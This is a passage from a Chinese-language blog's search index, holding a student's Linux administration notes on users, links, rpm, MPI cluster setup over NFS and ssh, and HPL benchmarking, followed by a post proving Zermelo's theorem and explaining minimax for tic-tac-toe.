./V**.run\u5373\u53ef\u3002\uff08\u9700\u8981\u6709gcc, make, perl\u624d\u80fd\u5b89\u88c5\u6210\u529f)\n3. ubuntu-server\u7248\u6ca1\u6709X\u7a97\u53e3\u56e0\u6b64\u65e0\u6cd5\u590d\u5236\u7c98\u8d34\uff0c\u53ef\u4ee5\u901a\u8fc7ssh\u8fde\u63a5\u3002(1. \u7f51\u7edc\u9009\u62e9\u6865\u63a5\u6a21\u5f0f 2. ifconfig\u67e5\u770bip\u5730\u5740 3. \u8fd0\u884csshd(server\u7248\u5b89\u88c5\u65f6\u53ef\u52fe\u9009openssh\uff0c\u7136\u540e\u5c31\u4f1a\u9ed8\u8ba4\u572822\u7aef\u53e3\u5f00\u542fssh\u670d\u52a1) 4.ssh\u8fde\u63a5\n\n1/29\n1.  chown [-r] user:grp file\n    chmod [-r] xyz file \u6216 chmod [-r] ugo+-=rwx file\n2.  \u8f6f/\u786c\u94fe\u63a5\n    ln f1 f2\u521b\u5efa\u786c\u94fe\u63a5\u3002f1, f2\u5b8c\u5168\u5bf9\u7b49\uff0c\u5220\u9664f1\uff0cf2\u6587\u4ef6\u4f9d\u7136\u5b58\u5728\u3002\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u8bfe\u4e2d\u7684\u65e0\u73af\u56fe\u7ed3\u6784\u3002\u5f53\u5220\u9664\u6389\u6240\u6709\u786c\u94fe\u63a5\u540e\uff0c\u6587\u4ef6\u624d\u4f1a\u88ab\u771f\u6b63\u5220\u9664\u3002\n    ln -s f1 f2\u521b\u5efa\u8f6f\u94fe\u63a5\u3002f1\u548cf2\u6709\u4e3b\u4ece\u5173\u7cfb\u3002f2\u76f8\u5f53\u4e8e\u4e00\u4e2a\u5f88\u5c0f\u7684\u5b58\u50a8\u4e86f1\u7684\u4f4d\u7f6e\u7684\u7279\u6b8a\u6587\u4ef6\u3002\u5220\u9664\u6389f1\u540e\uff0cf2\u5931\u6548\u3002\n3. \n    useradd [opt] username\n        -g \u7528\u6237\u6240\u5c5e\u7684\u7ec4\n        -G \u6307\u5b9a\u591a\u4e2a\u7ec4\n        -d \u6307\u5b9a\u7528\u6237\u4e3b\u76ee\u5f55\n        -s \u6307\u5b9a\u767b\u5f55\u7684shell\n    userdel [-r] username   -r\u4f1a\u540c\u65f6\u5220\u9664\u7528\u6237\u4e3b\u76ee\u5f55\n    usermod [opt] username\n4.\n    passwd\u4fee\u6539\u5f53\u524d\u7528\u6237\u5bc6\u7801\uff08\u9700\u8981\u9a8c\u8bc1\uff09\n    (root)passwd username\u4fee\u6539\u6307\u5b9a\u7528\u6237\u5bc6\u7801\uff08\u65e0\u9700\u9a8c\u8bc1\uff09\n\n    /etc/passwd\u6587\u4ef6\u4e00\u884c\u8bb0\u5f55\u5bf9\u5e94\u7740\u4e00\u4e2a\u7528\u6237\n    example line\uff1a\n        sam:x:200:50:Sam san:/home/sam:/bin/sh\n        \u7528\u6237\u540d:\u53e3\u4ee4(\u52a0\u5bc6\u540e\u7684\u5bc6\u7801\uff0c\u6216x\u800c\u771f\u5b9e\u7684\u5bc6\u7801\u4f4d\u4e8e/etc/shadow):\u7528\u6237\u6807\u8bc6\u53f7:\u7ec4\u6807\u8bc6\u53f7:\u6ce8\u91ca\u6027\u63cf\u8ff0:\u4e3b\u76ee\u5f55:\u767b\u5f55Shell\n\n    /etc/shadow\u548c/etc/group\u6587\u4ef6\u683c\u5f0f\n\n02/05\n1. \u5b89\u88c5gcc\n    1) linux\u4e0b\u5b89\u88c5\u7a0b\u5e8f\u53ef\u5206\u4e3a:\n        (1) \u6e90\u7801\u5b89\u88c5: \u9700\u8981\u6709\u7f16\u8bd1\u73af\u5883\u5982gcc\u73af\u5883\uff0c\u76f8\u5bf9\u4e8e\u79bb\u7ebf\u5b89\u88c5\uff0c\u4e0d\u7528\u64cd\u5fc3\u4f9d\u8d56\uff0c\u5c31\u662f\u7f16\u8bd1\u65f6\u95f4\u6709\u70b9\u957f\u3002\n        (2) \u5305\u5b89\u88c5(\u5df2\u7ecf\u7f16\u8bd1\u4e3a\u4e8c\u8fdb\u5236\u6587\u4ef6)\uff1a\u901a\u8fc7\u5305\u7ba1\u7406\u5668\n                    \u5728\u7ebf: \n                yum install package\n            \u79bb\u7ebf: \n                rpm -ivh rpm\u6587\u4ef6\n            \u79bb\u7ebf\u5b89\u88c5\u9700\u8981\u624b\u52a8\u5904\u7406\u4f9d\u8d56\u3002\n                rpm -Uvh *.rpm --force --nodeps: \u5ffd\u7565\u4f9d\u8d56\u8986\u76d6\u5b89\u88c5\n        Ubuntu\u4e0b\u4e3aapt[-get]\u548cdpkg\n    3) \u5728centos\u7684\u955c\u50cf\u7684Packages\u4e0b\u53ef\u627e\u5230\u5404\u79cd\u7a0b\u5e8f\u7684rpm\u6587\u4ef6\n    4) GNU/gcc \u4e2dc, c++, fortran\u5bf9\u5e94\u7f16\u8bd1\u5668\u9700\u8981\u5206\u5f00\u5b89\u88c5\n2. \u7f16\u8bd1\u5b89\u88c5mpich2\n    1) \u82e5\u6ca1\u6709g++, gfortran ./configure\u9700\u8981\u6dfb\u52a0--disable-c++, --disable-fortran\n    2) \u8fd8\u9700\u8981perl\u624d\u80fd\u5b89\u88c5\u6210\u529f\n\n02/06\n1. Run an mpi cluster within a LAN\n    1) \u5728\u6bcf\u4e2a\u8282\u70b9\u521b\u5efampiuser(\u6dfb\u52a0\u5230sudoers:\u4f7f\u7528visudo\u547d\u4ee4\u6216vi /etc/passwd)(ubuntu\u4e3a/etc/sudoers, \u66f4\u7b80\u5355\u7684\u65b9\u5f0f\u4e3asudo usermod -aG sudo \u7528\u6237\u540d)\n        \u4fee\u6539/etc/hosts\u6587\u4ef6\n    2)  ssh-keygen -t dsa(rsa is ok, too)\n        ssh-copy-id cilent\n        ssh cilent      (\u9ed8\u8ba4\u4f7f\u7528\u5f53\u524d\u7528\u6237mpiuser\u767b\u5165)\n    3) nfs (\u8be5centos\u4e0a\u5df2\u7ecf\u5b89\u88c5nfs-utils-xxx, \u65e2\u5305\u542bserver\u53c8\u5305\u542bclient)\n        (1) \u5728server\u4e0avi /etc/exports:\n            /home/mpiuser/cloud *(rw,sync,no_root_squash,no_subtree_check)\n            exportfs -arv(\u5168\u90e8, \u91cd\u65b0,\u663e\u793a\u4fe1\u606f \u6302\u8f7d)\n             \u68c0\u67e5\n            a. showmount [-ae] [hostname|IP]\n            b. rpcinfo [-p] [IP|hostname]\n            c. netstat -autp\n        (2) \u5728client\u4e0a\n            mkdir cloud\n            sudo mount -t nfs centos1:/home/mpiuser/cloud ~/cloud\n\n            sudo vi /etc/fstab:\n                #MPI CLUSTER SETUP\n                centos1:/home/mpiuser/cloud /home/mpiuser/cloud nfs\n\n            one line:\n                (root)mkdir cloud;mount -t nfs centos1:/home/mpiuser/cloud /home/mpiuser/cloud;echo 'centos1:/home/mpiuser/cloud /home/mpiuser/cloud nfs'&gt;&gt;/etc/fstab\n             check\n            df -h\n    4) mpiexec -n N --hostfile hostfile executablefile\n        N: \u8fdb\u7a0b\u6570\n        hostfile\u683c\u5f0f:\n        MPICH2: ip/host:n       n\u4e3a\u8be5\u8282\u70b9core\u6570\n        OpenMPI: ip/host slots=n\n2. run HPL\n    1) root \u5b89\u88c5\u5bfc\u81f4\u6ca1\u6709MPdir, MPinc, MPlib\u3002\u51b3\u5b9a\u91cd\u65b0\u5b89\u88c5\u3002\n    2) mpich2\u548copenmpi\u90fd\u662f\n        mkdir build; cd build\n        ../configure --prefix=/path/to/install\n        make; make install\n        &gt;&gt;&gt;from mpich2 README:169\n        IMPORTANT NOTE: The install directory has to be visible at exactly\n    the same path on all machines you want to run your applications\n    on. This is typically achieved by installing MPICH on a shared\n    NFS file-system. If you do not have a shared NFS directory, you\n    will need to manually copy the install directory to all machines\n    at exactly the same location.\n       &lt;&lt;&lt;\n    \u5168\u5c40\u5b89\u88c5\u4f1a\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u653e\u5728/bin, /usr/bin /usr/local/bin\u7b49\u91cc\u9762, \u5e93\u653e\u5728/lib, /usr/lib\u7b49\n    \u800c\u5c40\u90e8\u5b89\u88c5\u7a0b\u5e8f\u7684\u6240\u6709\u4f9d\u8d56\u4f1a\u5b58\u5728\u4e8e\u4e00\u4e2a\u6587\u4ef6\u5939\u4e0b, \u53ef\u4ee5\u590d\u5236\u79fb\u52a8\u5230\u5176\u5b83\u4f4d\u7f6e\u6267\u884c?(\u9700\u8981\u6dfb\u52a0\u73af\u5883\u53d8\u91cf)\n    3) BLAS\u5e93\u5b89\u88c5\n        ATLAS:\n        GotoBLAS2(Goto2):\n\n    4) HPL&amp;HPCG\n        HPL:\n        cp Make.&lt;arch&gt; in top-level directory\n        make arch=xxx\n        cd /bin/&lt;arch&gt;\n        run xhpl\n        HPCG:\n        cp Make.&lt;arch&gt; to top/setup directory\n        mkdir build\n        cd build\n         ../configure &lt;arch&gt;   #error1\n        make\n        cd /bin/\n        run xhpcg\n\n        #error1:/bin/sh^M: bad interpreter: No such file or directory\n        #solve:\n            vi ./configure\n            :set ff/fileformat=unix\n02/07\n1. tips\n    \u5904\u7406\u5668\u578b\u53f7, \u4e3b\u9891, cache\u7b49\u4fe1\u606f: cat /proc/cpuinfo\n    \u5185\u5b58\u4fe1\u606f: cat /proc/meminfo\n    \u78c1\u76d8\u4fe1\u606f: fdisk -l\n    \u67e5\u770blinux\u7248\u672c: lsb_release -a \n\n    top: \u4efb\u52a1\u7ba1\u7406\u5668\n    free -m \u67e5\u770b\u5185\u5b58\u4f7f\u7528\u72b6\u51b5\n02/08\n1.  OpenMP\u4e5f\u662f\u4e00\u4e2a\u5e93\uff0c\u9700\u8981\u5b89\u88c5\uff0c\u76ee\u7684\u662f\u4f7f\u5f97\u4e00\u4e2a\u8fdb\u7a0b\u6709\u591a\u4e2a\u7ebf\u7a0b\u3002\n2. rpm\u7528\u6cd5:\n    (\u5df2\u5b89\u88c5)\n    rpm -qa     all\n    rpm -q pkg  \u8fd4\u56de\u5e26\u7248\u672c\u7684\u5305\u540d\n    rpm -qi pkg info\n    rpm -qf file    file: \u67e5\u770b\u6587\u4ef6\u5c5e\u4e8e\u54ea\u4e2a\u5305\n    rpm -ql pkg list: \u67e5\u770b\u5305\u5b89\u88c5\u7684\u6587\u4ef6\u7684\u8def\u5f84\n    rpm -qR pkg \u4f9d\u8d56\n    rpm -qc pkg conf: \u67e5\u770b\u5305\u7684\u914d\u7f6e\u6587\u4ef6\n    (\u672a\u5b89\u88c5\u52a0\u4e2ap\u9009\u9879, \u4e14\u9700\u8981\u6709\u5305\u7684rpm\u6587\u4ef6)\n    rpm -qpl xxx.rpm\n3. gcc -l\u9009\u9879\u4e0eLD_LIBRARY_PATH\n    \u7f16\u8bd1\u65f6\uff0c\u5982\u679c\u4e0d\u94fe\u63a5\u5e93(\u9759\u6001/\u52a8\u6001)\u4f1a\u51fa\u73b0undefined reference:\n        [mpiuser@izwz9fx70wphqjnuv22919z dynamic_lib]$ gcc -I./include -std=c99 -o Test Test.c\n        /tmp/cc4vyXu4.o: In function `main':\n        Test.c:(.text+0x302): undefined reference to `mult_s'\n        collect2: error: ld returned 1 exit status\n    \u4e14\u5982\u679c\u5e93\u4e0d\u5728\u6807\u51c6\u4f4d\u7f6e\u5982/usr/lib/\u5904\u7684\u8bdd(\u53ef\u901a\u8fc7gcc -lc --verbose\u67e5\u770b, lc\u4ee3\u8868libc.a, \u53ef\u6362\u6210\u5176\u4ed6\u5e93)\uff0c\u9700\u8981\u6dfb\u52a0-L\u9009\u9879,\n    \u5426\u5219\u4f1a\u62a5/usr/bin/ld: cannot find: \n        [mpiuser@izwz9fx70wphqjnuv22919z dynamic_lib]$ gcc -I./include -lfpu -std=c99 -o Test Test.c\n        /usr/bin/ld: cannot find -lfpu\n        collect2: error: ld returned 1 exit status\n    \u8fd0\u884c\u65f6, \u5982\u679c\u94fe\u63a5\u5e93\u4e0d\u5728/etc/ld.so.conf\u91cc\u7684\u8bdd, \u9700\u8981\u5b9a\u4e49\u73af\u5883\u53d8\u91cfLD_LIBTARY_PATH\u624d\u80fd\u8fd0\u884c\n    \u5426\u5219\u4f1a\u62a5cannot open shared object file:\n        [mpiuser@izwz9fx70wphqjnuv22919z dynamic_lib]$ bin/Test_shared\n        bin/Test_shared: error while loading shared libraries: libfpu.so: cannot open shared object file: No such file or directory\n</code></pre>","tags":["ASC"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/","title":"\u4e95\u5b57\u68cb\u4e0e\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5","text":"<p>\u7ecf\u8fc7\u6628\u665a\uff0c\u548c\u4eca\u5929\u65e9\u4e0a8\u70b9\u9192\u6765\u8db4\u5728\u5e8a\u4e0a\u52aa\u529b\u7684\u601d\u8003\u3002\u6211\u7ec8\u4e8e\u60f3\u8d77\u4e86\u5982\u4f55\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u8bc1\u660e\u7b56\u6885\u6d1b\u5b9a\u7406\u3002\u7136\u540e\u7ecf\u8fc7\u4e00\u4e0a\u5348\u7684\u52aa\u529b\uff0c\u6211\u6210\u529f\u4f7f\u7528\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5\u5b9e\u73b0\u4e86\u4e95\u5b57\u68cb(Tic-Tak-Toe)\u7684AI\uff0c\u7136\u540e\u6dfb\u52a0\u5230wwh\u7684\u4e95\u5b57\u68cb\u4ee3\u7801\u4e2d\u3002</p>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u6570\u5b66\u5f52\u7eb3\u6cd5\u8bc1\u660e\u7b56\u6885\u6d1b\u5b9a\u7406","title":"\u6570\u5b66\u5f52\u7eb3\u6cd5\u8bc1\u660e\u7b56\u6885\u6d1b\u5b9a\u7406","text":"<p>\u7b56\u6885\u6d1b\u5b9a\u7406\uff1a</p> <p>\u6761\u4ef6\uff1a</p> <ol> <li>\u6e38\u620f\u53cc\u65b9\u62e5\u6709\u5b8c\u5168\u4fe1\u606f\uff08\u5373\u4e00\u65b9\u660e\u786e\u53e6\u4e00\u65b9\u7684\u6bcf\u4e00\u4e2a\u884c\u52a8\u6240\u4ea7\u751f\u7684\u6240\u6709\u540e\u679c\uff09</li> <li>\u6e38\u620f\u7684\u89c4\u5219\u4e0d\u5305\u542b\u968f\u673a\u6027</li> <li>\u6e38\u620f\u5fc5\u5b9a\u5728\u6709\u9650\u6b65\u5185\u7ed3\u675f</li> </ol> <p>\u7ed3\u8bba\uff1a</p> <ul> <li>\u5148\u624b\u6216\u540e\u624b\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\uff08\u5982\u679c\u6e38\u620f\u53ea\u5305\u542b\u80dc\uff0c\u8d1f\u4e24\u79cd\u60c5\u51b5\uff0c\u5219\u7ed3\u8bba\u4e3a\uff1a\u5148\u624b\u6216\u540e\u624b\u5b58\u5728\u5fc5\u80dc\u7b56\u7565\uff09</li> </ul> <p>proof:</p> <p>\u5bf9\u6ee1\u8db3\u4e0a\u8ff0\u8981\u6c42\u7684\u4e00\u4e2a\u6e38\u620f\uff0c\u5047\u8bbe\u6e38\u620f\u7684\u6709\u9650\u6b65\u6570\u6700\u5927\u4e3aN\uff0c\u4ee5\u4e0b\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u8bc1\u660e\u5bf9\u4efb\u610f\u975e\u96f6\u81ea\u7136\u6570N\uff0c\u7ed3\u8bba\u6210\u7acb\u3002</p> <ol> <li> <p>\u5f53N=1\u65f6\uff0c\u7531\u4e8e\u5148\u624b\u884c\u52a8\u4e00\u6b65\u6e38\u620f\u4fbf\u7ed3\u675f\uff0c\u56e0\u6b64\u5b58\u5728\u51e0\u79cd\u53ef\u80fd\uff1a</p> <ul> <li>\u5b58\u5728\u5148\u624b\u8d62\u6216\u5e73\u7684\u7ed3\u5c40\uff0c\u56e0\u6b64\u65e0\u8bba\u662f\u5426\u5b58\u5728\u540e\u624b\u8d62\u7684\u7ed3\u5c40\uff0c\u5148\u624b\u5fc5\u7136\u9009\u62e9\u4e0d\u8d25\u7684\u7ed3\u5c40\u3002\u5373\u5148\u624b\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\u3002</li> <li>\u4e0d\u5b58\u5728\u5148\u624b\u8d62\u6216\u5e73\u7684\u7ed3\u5c40\uff0c\u5373\u6240\u6709\u7ed3\u5c40\u5747\u4e3a\u540e\u624b\u8d62\u3002\u540e\u624b\u5b58\u5728\u5fc5\u80dc\u7b56\u7565\u3002</li> </ul> <p>\u5747\u7b26\u5408\u5047\u8bbe\u3002</p> </li> <li> <p>\u5047\u8bbe\u5f53N=k\u65f6\u4e5f\u6210\u7acb\uff0c\u5219\u5f53N=k+1\u65f6\u3002\u5bf9\u4e8e\u5148\u624b\u7684\u6bcf\u4e00\u79cd\u884c\u52a8\uff0c\u5728\u8be5\u6761\u4ef6\u4e0b\u53ef\u5f62\u6210\u4e00\u4e2a\u201c\u5b50\u6e38\u620f\u201d\uff0c\u4e14\u8be5\u6e38\u620f\u884c\u52a8\u6b65\u6570\u4e0a\u9650\u4e3ak\u3002\u56e0\u6b64\u6309\u7167\u7ed3\u8bba\uff0c\u53ef\u80fd\u7684\u60c5\u51b5\u4e3a\uff1a</p> <ul> <li>\u6240\u6709\u201c\u5b50\u6e38\u620f\u201d\u4e2d\u5b58\u5728\u4e00\u4e2a\u4f7f\u5f97\u5148\u624b\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\u3002\u5219\u5148\u624b\u5fc5\u7136\u4f1a\u9009\u62e9\u5bf9\u5e94\u884c\u52a8\u4ea7\u751f\u8be5\u5b50\u6e38\u620f\u3002\u5373\u5148\u624b\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\u3002</li> <li>\u6240\u6709\u201c\u5b50\u6e38\u620f\u201d\u5747\u4e0d\u5b58\u5728\u5148\u624b\u5fc5\u4e0d\u8d25\u7b56\u7565\uff0c\u6309\u7167\u7ed3\u8bba\uff0c\u5219\u5fc5\u7136\u5747\u5b58\u5728\u540e\u624b\u5fc5\u4e0d\u8d25\u7b56\u7565\u3002\u5219\u539f\u6e38\u620f\u540e\u624b\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\u3002</li> </ul> <p>\u56e0\u6b64N=k+1\u65f6\u7ed3\u8bba\u4e5f\u6210\u7acb\uff08\u8fd9\u91cc\u8bf4\u660e\u7684\u540e\u624b\u5b58\u5728\u5fc5\u80dc\u7b56\u7565\uff0c\u5219\u5fc5\u7136\u5b58\u5728\u5fc5\u4e0d\u8d25\u7b56\u7565\uff09</p> </li> </ol> <p>Q.E.D</p> <p>\u6b64\u5b9a\u7406\u7684\u7ed3\u8bba\u5341\u5206\u6709\u529b\uff0c\u5b83\u8868\u660e\u4e00\u4e2a\u6e38\u620f\u4ece\u89c4\u5219\u5236\u5b9a\u5b8c\u6210\u540e\uff0c\u7ed3\u5c40\u5c31\u5df2\u7ecf\u786e\u5b9a\u4e86\u3002\u56e0\u4e3a\u5982\u679c\u6e38\u620f\u662f\u4e00\u65b9\u5fc5\u8d62\u7684\uff0c\u90a3\u4e48\u7406\u8bba\u4e0a\u65e0\u8bba\u53e6\u4e00\u65b9\u600e\u4e48\u52aa\u529b\u90fd\u6c38\u8fdc\u90fd\u53ea\u80fd\u8d25\u5317\u3002\u800c\u5982\u679c\u6e38\u620f\u662f\u4e00\u65b9\u81f3\u5c11\u80fd\u4fdd\u8bc1\u5e73\u5c40\u7684\uff0c\u90a3\u4e48\u540c\u6837\u65e0\u8bba\u53e6\u4e00\u65b9\u600e\u4e48\u52aa\u529b\u4e5f\u53ea\u80fd\u548c\u5bf9\u65b9\u6253\u6210\u5e73\u624b\u3002</p> <p>\u7136\u800c\u8be5\u5b9a\u7406\u867d\u7136\u8bf4\u660e\u4e86\u5b58\u5728\u8fd9\u79cd\u7b56\u7565\uff0c\u4f46\u5e76\u6ca1\u6709\u7ed9\u51fa\u7b56\u7565\u662f\u4ec0\u4e48\uff1f\u662f\u600e\u4e48\u4e00\u79cd\u201c\u5f62\u5f0f\u201d\uff1f\u7a76\u7adf\u600e\u4e48\u624d\u80fd\u6309\u7167\u7b56\u7565\u6765\u8d70\u5462\uff1f</p> <p>HOWERVER\uff0c\u8fd9\u6837\u7684\u7b56\u7565\u4e8b\u5b9e\u4e0a\u4e00\u70b9\u4e5f\u4e0d\u62bd\u8c61\uff0c\u800c\u4e14\u6309\u7167\u7b56\u7565\u8d70\u7684\u65b9\u6cd5\u4e5f\u975e\u5e38\u7b80\u5355\uff01\uff01\uff01\u7b54\u6848\u5c31\u662f\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5\uff01\uff01\uff01</p>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5","title":"\u6700\u5927\u6700\u5c0f\u503c\u7b97\u6cd5","text":"","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u6b65\u9aa4","title":"\u6b65\u9aa4","text":"<ol> <li> <p>\u9996\u5148\uff0c\u6e38\u620f\u53cc\u65b9\u7684\u6240\u6709\u53ef\u80fd\u884c\u52a8\u53ef\u4ee5\u62bd\u8c61\u6210\u4e00\u4e2a\u4e00\u9897\u51b3\u7b56\u6811\u3002\u53cc\u65b9\u7684\u4e0d\u540c\u884c\u52a8\u4ea7\u751f\u4e0d\u540c\u7684\u5206\u652f\u3002\u76f4\u81f3\u67d0\u4e00\u65b9\u7684\u884c\u52a8\u5bfc\u81f4\u6e38\u620f\u7ed3\u675f\uff0c\u5e76\u5f62\u6210\u4e00\u4e2a\u53f6\u8282\u70b9\u3002</p> </li> <li> <p>\u6211\u4eec\u4ee5\u5148\u624b\u4e3a\u89c6\u89d2\uff0c\u628a\u51b3\u7b56\u6811\u7684\u6bcf\u4e2a\u53f6\u5b50\u8282\u70b9\u6807\u4e0a\u4e00\u4e2a\u503c\uff0c\u80dc\u8bb0\u4e3a1\uff0c\u8d1f\u4e3a-1\uff0c\u5e73\u4e3a0\u3002</p> </li> <li> <p>\u6211\u4eec\u77e5\u9053\u7b2c0\u5c42\uff08\u6839\u8282\u70b9\uff09\u4e3a\u5148\u624b\u7684\u51b3\u7b56\u5c42\u3002\u7531\u4e8e\u53cc\u65b9\u8f6e\u6d41\u51b3\u7b56\uff0c\u6613\u77e5\uff0c\u5076\u6570\u5c42\u4e3a\u5148\u624b\u51b3\u7b56\u5c42\uff0c\u6211\u4eec\u628a\u5b83\u79f0\u4e3aMAX\u5c42\u3002\u540c\u7406\uff0c\u5947\u6570\u5c42\u79f0\u4e3aMIN\u5c42\u3002</p> </li> <li> <p>\u63a5\u7740\u6211\u4eec\u5f00\u59cb\u81ea\u5e95\u5411\u4e0a\u904d\u5386\u51b3\u7b56\u6811\u3002\u5bf9\u4e8e\u6bcf\u4e2aMIN\u5c42\u7684\u7ed3\u70b9\uff0c\u6211\u4eec\u5c06\u5176\u5b50\u8282\u70b9\u4e2d\u7684\u6700\u5c0f\u503c\u8d4b\u503c\u7ed9\u8be5\u8282\u70b9\u3002\u5bf9\u4e8e\u6bcf\u4e2aMAX\u5c42\u7684\u7ed3\u70b9\uff0c\u6211\u4eec\u5c06\u5176\u5b50\u8282\u70b9\u4e2d\u7684\u6700\u5927\u503c\u8d4b\u503c\u7ed9\u8be5\u8282\u70b9\u3002\u6700\u7ec8\uff0c\u6211\u4eec\u80fd\u5f97\u6839\u8282\u70b9\u7684\u503c\u3002</p> </li> </ol>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u6839\u8282\u70b9\u503c\u7684\u542b\u4e49","title":"\u6839\u8282\u70b9\u503c\u7684\u542b\u4e49","text":"<ol> <li>\u4e3a1\uff0c\u8fd9\u8868\u660e\u5148\u624b\u5b58\u5728\u5fc5\u80dc\u7b56\u7565\u3002</li> <li>\u4e3a0\uff0c\u8fd9\u8868\u660e\u5148\u624b\u5b58\u5728\u5fc5\u5e73\u7b56\u7565\uff0c\u540e\u624b\u600e\u4e48\u4e5f\u4e0d\u53ef\u80fd\u8d62\u5148\u624b\u3002</li> <li>\u4e3a-1\uff0c\u8fd9\u8868\u660e\u53ea\u8981\u540e\u624b\u8db3\u591f\u201c\u806a\u660e\u201d\uff0c\u6bcf\u6b21\u90fd\u80fd\u4e0b\u6700\u201c\u6b63\u786e\u201c\u7684\u68cb\uff08MIN\u5c42\u4f7f\u8282\u70b9\u503c\u6700\u5c0f\uff09\uff0c\u90a3\u4e48\u5148\u624b\u5fc5\u8d25\u3002</li> </ol>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u539f\u7406","title":"\u539f\u7406","text":"<p>\u975e\u4e25\u683c\u5730\u5206\u6790\uff0c\u6211\u4eec\u8003\u8651\u4e0b\u56fe\u7684\u60c5\u5f62\uff0c\u65b9\u5f62\u4ee3\u8868MAX\u5c42\uff0c\u5706\u5f62\u4ee3\u8868MIN\u5c42\u3002</p> <p>\u6700\u540e\u80fd\u591f\u8bc1\u660e\u5bf9\u4efb\u610f\u5c42\uff0c\u8be5\u5c42\u8282\u70b9\u7684\u503c\u8868\u793a\uff0c\u5148\u624b\u5b58\u5728\u7b56\u7565\u4f7f\u5f97\u5728\u8be5\u201c\u5f62\u52bf\u201d\u4e0b\uff0c\u5148\u624b\u6700\u7ec8\u201c\u6536\u76ca\u201d\uff08\u628a+1\u3001-1\u30010\u770b\u505a\u5bf9\u5148\u624b\u201c\u5f62\u52bf\u201d\u7684\u8bc4\u5206\uff09\u4e0d\u4f4e\u4e8e\u8be5\u503c\u3002\u4e25\u683c\u8bc1\u660e\u53ef\u4ee5\u5bf9\u5c42\u6570\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u3002</p> <p></p>","tags":["\u4e95\u5b57\u68cb","\u526a\u679d"]},{"location":"%E5%8D%9A%E5%AE%A2/2020/02/11/2020-02-11-%E4%BA%95%E5%AD%97%E6%A3%8B%E4%B8%8E%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%80%BC%E7%AE%97%E6%B3%95/#\u610f\u4e49","title":"\u610f\u4e49","text":"<p>\u53ef\u4ee5\u770b\u51fa\uff0c\u53ea\u8981\u6211\u4eec\u6784\u9020\u51fa\u4e86\u8fd9\u9897\u5b8c\u6574\u7684\u6811\uff0c\u628a\u5b83\u4fdd\u5b58\u6210\u4e00\u4e2a\u6587\u4ef6\u3002\u90a3\u4e48\u8fdb\u884c\u6e38\u620f\u65f6\uff0c\u6211\u4eec\u4fbf\u53ea\u662f\u4ece\u4e0a\u5f80\u4e0b\u9009\u62e9\u4e00\u6761\u8fb9\u8fd9\u4e48\u7b80\u5355\u3002\uff08\u5728\u81ea\u5e95\u5411\u4e0a\u904d\u5386\u6811\u7684\u540c\u65f6\uff0c\u9664\u4e86\u628a\u503c\u8d4b\u7ed9\u6bcf\u5c42\u8282\u70b9\uff0c\u8fd8\u53ef\u4ee5\u628a\u9009\u62e9\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\u4e5f\u5b58\u50a8\u4e0b\u6765\uff0c\u90a3\u4e48\u6b64\u65f6\u9009\u62e9\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5c31\u662fO(1)\uff09</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u4ece\u7406\u8bba\u4e0a\u662f\u8bc1\u660e\u4e86\u7b56\u6885\u6d1b\u5b9a\u7406\u532a\u5937\u6240\u601d\u7684\u7ed3\u8bba\uff0c\u5e76\u4e14\u8fd8\u7ed9\u51fa\u4e86\u53ef\u4ee5\u8bf4\u662f\u4e00\u79cd\u201c\u53ef\u6267\u884c\u201d\u7684\u65b9\u6cd5\u3002\u7136\u800c\uff0c\u6570\u5b66\u4e0a\u7684\u53ef\u884c\u5728\u5b9e\u9645\u4e0a\u5374\u672a\u5fc5\u53ef\u884c\u3002\u4ee5\u4e94\u5b50\u68cb\u4e3a\u4f8b\uff0c\u68cb\u76d8\u4e3a\\(15 \\times 15 